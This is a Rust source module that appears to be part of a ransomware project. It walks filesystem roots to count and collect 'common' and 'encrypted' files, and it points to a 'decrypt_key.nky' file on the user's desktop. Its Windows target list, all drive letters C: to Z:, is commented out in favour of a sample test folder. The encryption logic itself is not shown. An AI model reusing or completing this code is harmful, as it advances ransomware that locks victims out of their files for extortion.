pub mod utils;

use dirs::desktop_dir;
use std::fs::Metadata;
use walkdir::{DirEntry};

pub fn count_common_files(dir_path: &str) -> usize {
    utils::traverse::get_common_files_iterator(dir_path).count()
}

pub fn find_common_files(dir_path: &str, f: impl Fn(DirEntry, Metadata)) {
    utils::traverse::get_common_files_iterator(dir_path).for_each(|entry| match entry.metadata() {
        Ok(metadata) => f(entry, metadata),
        _ => (),
    });
}

pub fn count_encrypted_files(dir_path: &str) -> usize {
    utils::traverse::get_encrypted_files_iterator(dir_path).count()
}

pub fn find_encrypted_files(dir_path: &str, f: impl Fn(DirEntry, Metadata)) {
    utils::traverse::get_encrypted_files_iterator(dir_path).for_each(|entry| {
        match entry.metadata() {
            Ok(metadata) => f(entry, metadata),
            _ => (),
        }
    });
}

pub fn get_decrypt_key_nky_path() -> String {
    match desktop_dir() {
        Some(path) => path.join("decrypt_key.nky").as_path().display().to_string(),
        _ => "".into(),
    }
}

#[cfg(target_family = "unix")]
pub static ROOT_DIRS: [&str; 1] = ["/"];

#[cfg(target_family = "windows")]
/*pub static ROOT_DIRS: [&str; 24] = [
    "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:",
    "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:",
];*/
pub static ROOT_DIRS: [&str; 1] = ["D:\\sample\\"];
